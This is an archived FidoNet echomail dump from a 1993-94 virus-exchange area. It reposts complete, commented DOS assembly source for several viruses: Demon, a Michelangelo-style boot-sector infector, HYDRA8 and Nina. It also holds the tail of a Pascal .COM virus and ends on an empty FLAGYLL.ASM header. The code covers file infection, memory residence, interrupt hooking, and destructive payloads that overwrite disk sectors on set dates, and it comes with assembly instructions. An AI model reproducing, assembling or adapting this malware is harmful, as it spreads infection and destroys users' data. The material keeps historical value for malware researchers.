Writeln('        ██▒       ██▒        ██▒        ██▒       ██▒   ██▒  ');
Writeln('     @   ████████████▒        ██▒        ██▒       ██▒   ████████████
 @');
Writeln('        ██▒▒▒▒▒▒▒▒██▒        ██▒        ██▒       ██▒    ▒▒▒▒▒▒▒▒▒██▒
');
Writeln('     @   ██▒       ██▒        ██▒        ██▒       ██▒             ██▒
  @');
Writeln('        ██▒       ██▒        ██▒        ██▒      ███▒   ██       ███▒
');
Writeln('     @   ██▒       ██▒   ████████████    ███████████▒▒    ██████████▒▒
  @');
Writeln('         ▒▒        ▒▒    ▒▒▒▒▒▒▒▒▒▒▒▒    ▒▒▒▒▒▒▒▒▒▒▒      ▒▒▒▒▒▒▒▒▒▒
');
Writeln('     @   @');
Writeln('     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@');
REPEAT
LOOPVAR:=0;
UNTIL LOOPVAR=1;
end;
End.


{ Although this is a primitive virus its effective. }
{ In this virus only the .COM                       }
{ files are infected. Its about 13K and it will     }
{ change the date entry.                            }

-+-  CrossPoint v3.02
 + Origin: The Hamburger Haven 1-318-478-9940 (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/A=NNNN       Set NewExe segment alignment factor

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 63 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:14 
 To   : -  *.*  -                                                               
 Subj : DEMON.ASM                                                               
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5f9e
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Bryan Sullivan, 2:283/718 (06 Nov 94 16:57)
* To   : Dr T.
* Subj : DEMON.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Dt: 19-Oct-91 04:19
@RFC-Return-Receipt-To: Bryan.Sullivan@f718.n283.z2.fidonet.org
By: Skin Head
To: All
Re: New Source Code

;========== Demon virus ==================================== 22.09.91 ========
;
; Assemble and link with:  TASM  DEMON.VIR
;                          TLINK DEMON /X/T
; Infect all .COM programs in current directory with: DEMON
;
;                       !!! NOT ON A TUESDAY !!!
;
;-------------- Constants and structures

Tuesday         =       2                       ; INT 21h, AH=2Ah

Search_Rec      struc                           ; directory search record
                db      21 dup (?)              ;   reserved for DOS
  FileAttr      db      ?                       ;   file attribute
  FileTime      dw      ?                       ;   packed file time
  FileDate      dw      ?                       ;   packed file date
  FileSize      dd      ?                       ;   long file size
  FileName      db      13 dup (?)              ;   ASCIIZ FILENAME.EXT
Search_Rec      ends

;-------------- Demon virus segment

Virus           segment
                assume  cs:Virus,ds:Virus,es:Virus,ss:Virus

                org     0080h
DTA             Search_Rec <>                   ; disk transfer area

                org     0100h
Demon:                                          ; virus entry point
Virus_Size      =       Virus_End - Demon       ; virus size = 272 bytes

                mov     dx,offset All_COM       ; find first .COM file,
                mov     ah,4eh                  ;   including hidden/system
                mov     cx,110bh
                int     21h
                nop
                jnc     Infect                  ; abort if no files found
                jmp     short Check_Day
Infect:         call    Replicate               ; overwrite first 272 bytes
                mov     dx,offset DTA
                mov     ah,4fh                  ; find next .COM file,
                int     21h                     ;   go check day if none found
                nop                             ;   else repeat
                jnc     Next_File
                jmp     short Check_Day
Next_File:      jmp     Infect
Check_Day:      mov     ah,2ah                  ; get DOS date, check day
                int     21h
                cmp     al,Tuesday              ; Tuesday ?
                je      Thrash_Drive            ; if yes, thrash drive C:
                mov     ah,4ch                  ;   else exit to DOS
                int     21h

Thrash_Drive:   mov     Counter,0               ; overwrite first 160 sectors
                jmp     Write_Sectors           ;   of drive C: with garbage
Write_Sectors:  mov     al,Drive_C              ; Error: doesn't work !
                mov     cx,160                  ; AL=C:, CX=160 sectors
                mov     dx,0                    ; DX=highest sector in drive !
                mov     bx,0                    ; DS:BX=start of PSP area
                int     26h                     ; overwrite sectors
                inc     Counter
                cmp     Counter,10              ; repeat 10 times
                je      Show_Msg
                jne     Write_Sectors
Show_Msg:       mov     ah,09h                  ; show a fake error message
                mov     dx,offset Virus_Msg     ;   and exit to DOS
                int     21h
                mov     ah,4ch
                int     21h

Replicate:      mov     dx,offset DTA.FileName  ; save file attribute
                mov     ax,4300h
                int     21h
                mov     COM_Attr,cx
                nop
                xor     cx,cx                   ; unprotect the .COM file
                mov     ax,4301h                ;   in case it's read-only
                int     21h
                nop
                mov     ax,3d02h                ; open .COM file for R/W,
                int     21h                     ;   abort on error
                nop
                jc      Check_Day
                mov     bx,ax                   ; BX = file handle
                mov     ax,5700h
                int     21h                     ; save file date and time
                nop
                mov     COM_Time,cx
                mov     COM_Date,dx
                mov     dx,offset Demon         ; overwrite first 272 bytes
                mov     ah,40h                  ;   of .COM program file
                mov     cx,Virus_Size           ;   with the virus code
                int     21h
                nop
                mov     ax,5701h                ; restore file date and time
                mov     dx,COM_Date
                mov     cx,COM_Time
                int     21h
                mov     ah,3eh                  ; close the file
                int     21h
                nop
                mov     dx,offset DTA.FileName  ; restore file attribute
                mov     cx,COM_Attr
                mov     ax,4301h
                int     21h
                retn

All_COM         db      '*.COM',0               ; dir search specification
COM_Date        dw      0                       ; packed .COM program date
COM_Time        dw      0                       ; packed .COM program time
COM_Attr        dw      0                       ; .COM program file attribute
Counter         db      0                       ; used when thrashing drive C:
Drive_C         db      2                       ; INT 26h C: drive number
                dw      0
Copyright       db      'Demonhyak Viri X.X (c) by Cracker Jack 1991 (IVRL)'
                dw      0
Virus_Msg       db      10,13,'Error eating drive C:',10,13,'$'

Virus_End       label   byte                    ; virus code+data end

Virus           ends
                end     Demon

-+-  FastEcho/386 1.41.b7/Real
 + Origin: Hans' Point with DOSBoss West, Amsterdam (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/zi,/zd,/zn   Debug info: zi=full, zd=line numbers only, zn=none

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 64 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:14 
 To   : -  *.*  -                                                               
 Subj : MICHANGL.A1                                                             
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5fa5
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Ron Toler, 2:283/718 (06 Nov 94 16:58)
* To   : Mike Salvino
* Subj : MICHANGL.A1
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Ron.Toler@f718.n283.z2.fidonet.org
obsluha 13h:    push    ds
        push    ax
        or  dl,dl           ; drive a: ?
        jnz loc_1           ; ak nie, stara obsluha
        xor ax,ax           ; ak ano, pozri ci motor bezi
        mov ds,ax           ; (ked bezi, tak by odbiehanie
                        ; na boot sektor bolo napadne
                        ; - hrcal by disk, pri zapnuti
                        ; sa to strati)
        test    byte ptr ds:[43Fh],1    ; (0000:043F=10h)
        jnz loc_1           ; ak bezi, tak stara obsluha
        pop ax          ; ak nebezi, tak stara obsluha
        pop ds
        pushf
        call    dword ptr cs:[0Ah]
        pushf               ; Push flags
        call    sub_1           ; rozmnoz sa na a:
        popf                ; Pop flags
        retf    2           ; vrat sa z int s tymito flagmi
loc_1:
        pop ax
        pop ds
        jmp dword ptr cs:[0Ah]  ; stara obsluha

;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
;                MNOZENIE SA
;▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄

sub_1       proc    near
        push    ax          ; SCHOVAJ REGS
        push    bx
        push    cx
        push    dx
        push    ds
        push    es
        push    si
        push    di
        push    cs
        pop ds
        push    cs
        pop es
        mov si,4
loc_2:
        mov ax,201h         ; 1 sektor citaj
        mov bx,200h         ; za seba (si 512 b. dlhy)
        mov cx,1            ; boot sektor (1. na 0. stope)
        xor dx,dx           ; disk a:
        pushf
        call    dword ptr ds:[0Ah]  ; stara obsluha
        jnc loc_3           ; error ?
        xor ax,ax           ; error - disk reset
        pushf               ;
        call    dword ptr ds:[0Ah]  ; (6C20:000A=0AF1Ah)
        dec si
        jnz loc_2           ; skus to 4 x
        jmp short loc_6     ; a ked nic, vykasli sa na to
loc_3:
        xor si,si           ; vsetko ok, pokracujeme
        cld
        lodsw               ; porovnaj prve 4 byte z bootu
        cmp ax,[bx]         ; so sebou, aby si zistil, ci
        jne loc_4           ; uz si tam - nakazeny disk
        lodsw
        cmp ax,[bx+2]
        je  loc_6           ; ak si tam, netrba infikovat
                        ; "AIDS staci dostat raz."
loc_4:
        mov ax,301h         ; avsak ak tam nie si, tak
        mov dh,1            ; ten disk nakaz
        mov cl,3            ; nastav znacku, kam odlozit
        cmp byte ptr [bx+15h],0FDh  ; povodny boot
        je  loc_5           ; (do ktoreho sektora)
        mov cl,0Eh          ; podla typu diskety
loc_5:                      ; (0e - HD, 3 - DD, 7 - hard)
        mov word ptr ds:[8],cx  ; uloz znacku
        pushf               ; a zapis povodny boot
        call    dword ptr ds:[0Ah]
        jc  loc_6           ; error - neda sa - vyskoc von
        mov si,3BEh         ; dopis originalnu partition
        mov di,1BEh         ; na svoj koniec
        mov cx,21h
        cld
        rep movsw
        mov ax,301h         ; a zapis sa do bootu
        xor bx,bx
        mov cx,1
        xor dx,dx
        pushf               ; cez staru int 13h
        call    dword ptr ds:[0Ah]
loc_6:
        pop di          ; hotovo - koniec
        pop si
        pop es
        pop ds
        pop dx
        pop cx
        pop bx
        pop ax
        retn
sub_1       endp

START VIRUSU    xor ax,ax
        mov ds,ax           ; DS NA NULU
        cli             ; Disable interrupts
        mov ss,ax           ; stack pod seba
        mov ax,7C00h        ; tu si - natiahol si sa
        mov sp,ax           ; z bootu - sp pod seba
        sti             ; Enable interrupts
        push    ds          ; schovaj ds,ax
        push    ax
        mov ax,word ptr ds:[4Ch]    ; odloz si staru obsluhu int13h
        mov word ptr ds:[7C0Ah],ax
        mov ax,word ptr ds:[4Eh]
        mov word ptr ds:[7C0Ch],ax
        mov ax,word ptr ds:[413h]   ; top of memory zmensi o 2K
        dec ax
        dec ax
        mov word ptr ds:[413h],ax
        mov cl,6            ; prepocitaj na paragr. adr.
        shl ax,cl
        mov es,ax           ; nastav es
        mov word ptr ds:[7C05h],ax  ; a odloz si ju sem
        mov ax,0Eh          ; toto je offset noveho int13h
        mov word ptr ds:[4Ch],ax    ; nastav ten novy int
        mov word ptr ds:[4Eh],es
        mov cx,1BEh         ; skopiruj sa do vyhr. 2K pam.
        mov si,7C00h
        xor di,di
        cld
        rep movsb
        jmp dword ptr cs:[7C03h]    ; a skoc na seba po skopirovani
        xor ax,ax           ; sem skocis
        mov es,ax           ; 0 do es
        int 13h         ; reset disk a:
        push    cs          ; cs do ds
        pop ds
        mov ax,201h         ; precitaj boot
        mov bx,7C00h        ; do 7c00
        mov cx,word ptr ds:[8]  ; pozri si znacku, kde mas ulo-
                        ; zeny povodny boot
        cmp cx,7            ; ak je to 7 - tak si na harde
        jne loc_7           ; inak si na diskete
        mov dx,80h          ; na harde - c:
        int 13h         ; precitaj originalny boot
        jmp short loc_8     ; a pokracuj
loc_7:
        mov cx,word ptr ds:[8]  ; precitaj si kde mas boot
        mov dx,100h         ; z diskety
        int 13h
        jc  loc_8           ; error - nejde to - skonci
        push    cs          ; ak to ide cs do es
        pop es
        mov ax,201h         ; a precitaj si este boot
        mov bx,200h         ; za seba
        mov cx,1
        mov dx,80h          ; ale z hardu
        int 13h
        jc  loc_8           ; chyba - von
        xor si,si           ; porovnaj sa s bootom
        cld             ; ci je harddisk nakazeny
        lodsw
        cmp ax,[bx]
        jne loc_13
        lodsw
        cmp ax,[bx+2]
        jne loc_13          ; ak nie je nakazeny - nakaz
loc_8:
        xor cx,cx           ; 0 do cx
        mov ah,4
        int 1Ah         ; pozri si datum
                        ; ci je 6. 3.
        cmp dx,306h
        je  loc_9           ; ak je 6.3. - akcia
        retf                ; ak nie - von
loc_9:
        xor dx,dx           ; TOT' UCINOK VIRUSU
        mov cx,1            ; zacni na 0. stope a 1. sktr
loc_10:
        mov ax,309h         ; zapis 9 sektorov
        mov si,word ptr ds:[8]  ; pozri typ disku
        cmp si,3            ; disketa -> rovno zapis
        je  loc_11
        mov al,0Eh          ; HD disketa -> 14 sektorov
        cmp si,0Eh
        je  loc_11          ; a rovno zapis
        mov dl,80h          ; nie disketa - hard
        mov byte ptr ds:[7],4   ; tak nie 2, ale 4 hlavy
        mov al,11h          ; a 17 sektorov/ track
loc_11:
        mov bx,5000h        ; zober hocico z pamati
        mov es,bx
        int 13h         ; a zapis na disk
        jnc loc_12          ; nie je chyba - pokracuj
        xor ah,ah           ; chyba - reset disk
        int 13h
loc_12:
        inc dh          ; dalsia hlava ?
        cmp dh,byte ptr ds:[7]  ; max. headroom
        jb  loc_10          ; este nie - pokracuj
        xor dh,dh           ; ano - opat hlava 0
        inc ch          ; dalsi track
        jmp short loc_10        ; a znova
loc_13:
        mov cx,7            ; NAKAZENIE HARDU
        mov word ptr ds:[8],cx  ; sem uloz povodny boot
        mov ax,301h
        mov dx,80h
        int 13h
        jc  loc_8           ; error - out
        mov si,3BEh         ; no error - dopis partition
        mov di,1BEh
        mov cx,21h
        rep movsw
        mov ax,301h         ; a zapis sa do bootu
        xor bx,bx
        inc cl
        int 13h
        jmp short loc_8     ; a chod von

-+-  DinoMail v.1.0 Alpha
 + Origin: I just hate people who create virusses... (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/Txx          Specify output file type

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 65 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:14 
 To   : -  *.*  -                                                               
 Subj : HYDRA_8.ASM                                                             
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5fab
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Doug Bryce, 2:283/718 (06 Nov 94 16:59)
* To   : Brad Frazee
* Subj : HYDRA_8.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Doug.Bryce@f718.n283.z2.fidonet.org
PAGE  59,132

;██████████████████████████████████████████████████████████████████████████
;██                                      ██
;██                             HYDRA8                                   ██
;██                                      ██
;██                                                                      ██
;██  Disassembly by: -=>Wasp<=- aka >>Night Crawler<<                    ██
;██                                                                      ██
;██  Reassemble with TASM 2.0                                            ██
;██████████████████████████████████████████████████████████████████████████

DATA_1E     EQU 80H
DATA_16E    EQU 1EFH
DATA_17E    EQU 1F2H
DATA_18E    EQU 9D9AH

SEG_A       SEGMENT BYTE PUBLIC
        ASSUME  CS:SEG_A, DS:SEG_A


        ORG 100h

HYDRA8      PROC    FAR

START:
        JMP LOC_2           ; (01E2)
        DB   59H, 44H, 00H, 00H
DATA_4      DB  'HyDra-8   Beta - Not For Release'
        DB  '. *.CO?'
        DB  0
DATA_7      DW  0, 84FCH
DATA_9      DW  0
DATA_10     DB  0
        DB  29 DUP (0)
DATA_11     DB  0
        DB  0, 0, 0, 0, 0, 0
DATA_12     DB  0
        DB  0, 0, 0, 0, 0, 0
COPYRIGHT   DB  'Copyright (c)'
        DB  '  1991 by C.A.V.E.  '
DATA_13     DB  2AH
        DB   2EH, 45H, 58H, 45H, 00H
DATA_14     DB  33H
        DB  0C9H, 1EH, 52H,0E8H, 06H, 00H
        DB  0E8H, 13H, 00H,0EBH, 36H, 90H
        DB  0BEH, 48H, 01H,0BFH, 5AH, 01H
        DB  0B9H, 12H, 00H

LOCLOOP_1:
        XOR BYTE PTR [SI],0F5H
        MOVSB               ; Mov [si] to es:[di]
        LOOP    LOCLOOP_1       ; Loop if cx > 0

        RETN
        MOV AX,0F00H
        INT 10H         ; Video display   ah=functn 0Fh
                        ;  get state, al=mode, bh=page
        MOV AH,0
        INT 10H         ; Video display   ah=functn 00h
                        ;  set display mode in al
        MOV AX,200H
        MOV DH,0CH
        MOV DL,1FH
        INT 10H         ; Video display   ah=functn 02h
                        ;  set cursor location in dx
        XOR DX,DX           ; Zero register
        MOV DX,OFFSET DATA_12
        MOV AH,9
        INT 21H         ; DOS Services  ah=function 09h
                        ;  display char string at ds:dx
        MOV AX,200H
        MOV DH,18H
        MOV DL,0
        INT 10H         ; Video display   ah=functn 02h
                        ;  set cursor location in dx
        RETN
        MOV AX,4C00H
        INT 21H         ; DOS Services  ah=function 4Ch
                        ;  terminate with al=return code
        ADD [BP+SI-6563H],AH
        CMC             ; Complement carry
        PUSHF               ; Push flags
        XCHG    DH,CH
        MOV DI,DATA_18E
        DB   9BH,0F5H,0B2H, 94H, 99H, 81H
        DB  0CAH,0D1H
LOC_2:
        PUSH    AX
        MOV AX,CS
        ADD AX,1000H
        XOR DI,DI           ; Zero register
        MOV CX,1EFH
        MOV SI,OFFSET DS:[100H]
        MOV ES,AX
        REP MOVSB           ; Rep when cx >0 Mov [si] to es:[di]
        MOV AH,1AH
        MOV DX,OFFSET DATA_10
        INT 21H         ; DOS Services  ah=function 1Ah
                        ;  set DTA to ds:dx
        MOV AH,4EH          ; 'N'
        MOV DX,OFFSET DATA_4+22H
        INT 21H         ; DOS Services  ah=function 4Eh
                        ;  find 1st filenam match @ds:dx
        JC  LOC_6           ; Jump if carry Set
LOC_3:
        MOV AH,3DH          ; '='
        MOV AL,2
        MOV DX,OFFSET DATA_11
        INT 21H         ; DOS Services  ah=function 3Dh
                        ;  open file, al=mode,name@ds:dx
        MOV BX,AX
        PUSH    ES
        POP DS
        MOV AX,3F00H
        MOV CX,0FFFFH
        MOV DX,DATA_16E
        INT 21H         ; DOS Services  ah=function 3Fh
                        ;  read file, cx=bytes, to ds:dx
        ADD AX,1EFH
        MOV CS:DATA_9,AX
        CMP WORD PTR DS:DATA_17E,4459H
        JNE LOC_4           ; Jump if not equal
        MOV AH,3EH          ; '>'
        INT 21H         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        PUSH    CS
        POP DS
        MOV AH,4FH          ; 'O'
        INT 21H         ; DOS Services  ah=function 4Fh
                        ;  find next filename match
        JC  LOC_7           ; Jump if carry Set
        JMP SHORT LOC_3     ; (0204)
LOC_4:
        XOR CX,CX           ; Zero register
        MOV DX,CX
        MOV AX,4200H
        INT 21H         ; DOS Services  ah=function 42h
                        ;  move file ptr, cx,dx=offset
        JC  LOC_5           ; Jump if carry Set
        MOV AH,40H          ; '@'
        XOR DX,DX           ; Zero register
        MOV CX,CS:DATA_9
        INT 21H         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
LOC_5:
        MOV AH,3EH          ; '>'
        INT 21H         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        PUSH    CS
        POP DS
LOC_6:
        MOV AH,1AH
        MOV DX,DATA_1E
        INT 21H         ; DOS Services  ah=function 1Ah
                        ;  set DTA to ds:dx
        JMP SHORT LOC_10        ; (02B0)
        DB  90H
LOC_7:
        CLC             ; Clear carry flag
        XOR CX,CX           ; Zero register
        PUSH    DS
        PUSH    DX
        MOV AH,1AH
        MOV DX,OFFSET DATA_10
        INT 21H         ; DOS Services  ah=function 1Ah
                        ;  set DTA to ds:dx
        MOV DX,OFFSET DATA_13
        MOV AH,4EH          ; 'N'
        XOR CX,CX           ; Zero register
        INT 21H         ; DOS Services  ah=function 4Eh
                        ;  find 1st filenam match @ds:dx
        JC  LOC_6           ; Jump if carry Set
LOC_8:
        MOV AH,3CH          ; '<'
        XOR CX,CX           ; Zero register
        MOV DX,OFFSET DATA_11
        INT 21H         ; DOS Services  ah=function 3Ch
                        ;  create/truncate file @ ds:dx
        MOV BX,AX
        JC  LOC_6           ; Jump if carry Set
        MOV AX,3D02H
        MOV DX,OFFSET DATA_11
        INT 21H         ; DOS Services  ah=function 3Dh
                        ;  open file, al=mode,name@ds:dx
        MOV BX,AX
        CLC             ; Clear carry flag
        XOR DX,DX           ; Zero register
        MOV AH,40H          ; '@'
        MOV DX,OFFSET DATA_14
        MOV CX,5AH
        INT 21H         ; DOS Services  ah=function 40h
                        ;  write file cx=bytes, to ds:dx
        CMP AX,5AH
        JB  LOC_9           ; Jump if below
        MOV AH,3EH          ; '>'
        INT 21H         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        JC  LOC_9           ; Jump if carry Set
        MOV AH,4FH          ; 'O'
        INT 21H         ; DOS Services  ah=function 4Fh
                        ;  find next filename match
        JNC LOC_8           ; Jump if carry=0
LOC_9:
        MOV AX,4C00H
        INT 21H         ; DOS Services  ah=function 4Ch
                        ;  terminate with al=return code
LOC_10:
        XOR DI,DI           ; Zero register
        MOV SI,OFFSET DATA_15
        MOV CX,22H
        REP MOVSB           ; Rep when cx >0 Mov [si] to es:[di]
        POP BX
        MOV CS:DATA_7,0
        MOV WORD PTR CS:DATA_7+2,ES
        POP BX
        JMP DWORD PTR CS:DATA_7
DATA_15     DB  1EH
        DB   07H,0B9H,0FFH,0FFH,0BEH,0EFH
        DB   02H,0BFH, 00H, 01H, 2BH,0CEH
        DB  0F3H,0A4H, 2EH,0C7H, 06H, 00H
        DB   01H, 00H, 01H, 2EH, 8CH, 1EH
        DB   02H, 01H, 8BH,0C3H, 2EH,0FFH
        DB   2EH, 00H, 01H,0CDH
        DB  20H

HYDRA8      ENDP

SEG_A       ENDS



        END START

-+-  FidoPCB v1.4 [NR]
 + Origin: FidoNet * Mathieu NotВris * Brussels-Belgium-Europe (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/L            Specify library search paths

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 66 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:14 
 To   : -  *.*  -                                                               
 Subj : NINA.ASM                                                                
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5fbe
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Daniel Hendry, 2:283/718 (06 Nov 94 17:37)
* To   : Viral Doctor
* Subj : NINA.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
@RFC-Return-Receipt-To: Daniel.Hendry@f718.n283.z2.fidonet.org
.model tiny
.code
org 100h
; Disassembly done by Dark Angel of Phalcon/Skism
; for 40Hex Number 9, Volume 2 Issue 5
start:
                push    ax
                mov     ax,9753h                ; installation check
                int     21h
                mov     ax,ds
                dec     ax
                mov     ds,ax                   ; ds->program MCB
                mov     ax,ds:[3]               ; get size word
                push    bx
                push    es
                sub     ax,40h                  ; reserve 40h paragraphs
                mov     bx,ax
                mov     ah,4Ah                  ; Shrink memory allocation
                int     21h

                mov     ah,48h                  ; Allocate 3Fh paragraphs
                mov     bx,3Fh                  ; for the virus
                int     21h

                mov     es,ax                   ; copy virus to high
                xor     di,di                   ; memory
                mov     si,offset start + 10h   ; start at MCB:110h
                mov     cx,100h                 ; (same as PSP:100h)
                rep     movsb
                sub     ax,10h                  ; adjust offset as if it
                push    ax                      ; originated at 100h
                mov     ax,offset highentry
                push    ax
                retf

endfile         dw      100h ; size of infected COM file

highentry:
                mov     byte ptr cs:[0F2h],0AAh ; change MCB's owner so the
                                                ; memory isn't freed when the
                                                ; program terminates
                mov     ax,3521h                ; get int 21h vector
                int     21h

                mov     word ptr cs:oldint21,bx ; save it
                mov     word ptr cs:oldint21+2,es
                push    es
                pop     ds
                mov     dx,bx
                mov     ax,2591h                ; redirect int 91h to int 21h
                int     21h

                push    cs
                pop     ds
                mov     dx,offset int21
                mov     al,21h                  ; set int 21h to virus vector
                int     21h

                pop     ds                      ; ds->original program PSP
                pop     bx
                push    ds
                pop     es
return_COM:
                mov     di,100h                 ; restore original
                mov     si,endfile              ; file
                add     si,di                   ; adjust for COM starting
                mov     cx,100h                 ; offset
                rep     movsb
                pop     ax
                push    ds                      ; jmp back to original
                mov     bp,100h                 ; file (PSP:100)
                push    bp
                retf
exit_install:
                pop     ax                      ; pop CS:IP and flags in
                pop     ax                      ; order to balance the
                pop     ax                      ; stack and then exit the
                jmp     short return_COM        ; infected COM file
int21:
                cmp     ax,9753h                ; installation check?
                je      exit_install
                cmp     ax,4B00h                ; execute?
                jne     exitint21               ; nope, quit
                push    ax                      ; save registers
                push    bx
                push    cx
                push    dx
                push    ds
                call    infect
                pop     ds                      ; restore registers
                pop     dx
                pop     cx
                pop     bx
                pop     ax
exitint21:
                db      0eah ; jmp far ptr
oldint21        dd      ?

infect:
                mov     ax,3D02h                ; open file read/write
                int     91h
                jc      exit_infect
                mov     bx,ax
                mov     cx,100h
                push    cs
                pop     ds
                mov     ah,3Fh                  ; Read first 100h bytes
                mov     dx,offset endvirus
                int     91h
                mov     ax,word ptr endvirus
                cmp     ax,'MZ'                 ; exit if EXE
                je      close_exit_infect
                cmp     ax,'ZM'                 ; exit if EXE
                je      close_exit_infect
                cmp     word ptr endvirus+2,9753h ; exit if already
                je      close_exit_infect       ; infected
                mov     al,2                    ; go to end of file
                call    move_file_pointer
                cmp     ax,0FEB0h               ; exit if too large
                ja      close_exit_infect
                cmp     ax,1F4h                 ; or too small for
                jb      close_exit_infect       ; infection
                mov     endfile,ax              ; save file size
                call    write
                mov     al,0                    ; go to start of file
                call    move_file_pointer
                mov     dx,100h                 ; write virus
                call    write
close_exit_infect:
                mov     ah,3Eh                  ; Close file
                int     91h
exit_infect:
                retn

move_file_pointer:
                push    dx
                xor     cx,cx
                xor     dx,dx
                mov     ah,42h
                int     91h
                pop     dx
                retn

write:
                mov     ah,40h
                mov     cx,100h
                int     91h
                retn

                db      'Nina'
endvirus:
                int     20h ; original COM file

                end     start

-+-  Terminate 1.50/Pro
 + Origin: Rampton Birds' Box, +358-31-3564751, 28.800bps, 24h (2:283/718)
=============================================================================

Yoo-hooo-oo, -!


    ■ The Me┬eO

/yx           Extended memory swapping

--- Aidstest Null: /Kill
 * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)
SEEN-BY: 463/707 465/1 10 11 23 46 57 60 666 4651/1 4653/1 4657/3 5020/52
SEEN-BY: 5020/221 5030/48 84 96 136 170 179
.PATH: 5030/136 465/10 23

─ [19] Вирусы... (2:465/666) ─────────────────────────────────────── PVT.VIRII ─
 Msg  : 67 of 90                                                                
 From : MeteO                               2:5030/136      Tue 09 Nov 93 09:14 
 To   : -  *.*  -                                                               
 Subj : FLAGYLL.ASM                                                             
────────────────────────────────────────────────────────────────────────────────
.MSGID: 2:5030/136 2cdf5fc3
.PID: 3DS 3.0 [Reg]
.RealName: Max Ivanov
═══════════════════════════════════════════════════════════════════════════════
* Kicked-up by MeteO (2:5030/136)
* Area : VIRUS (Int: Инфоpмация о виpусах)
* From : Gilbert Holleman, 2:283/718 (06 Nov 94 17:38)
* To   : Bill Dirks
* Subj : FLAGYLL.ASM
═══════════════════════════════════════════════════════════════════════════════
@RFC-Path:
ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
18.n283!not-for-mail
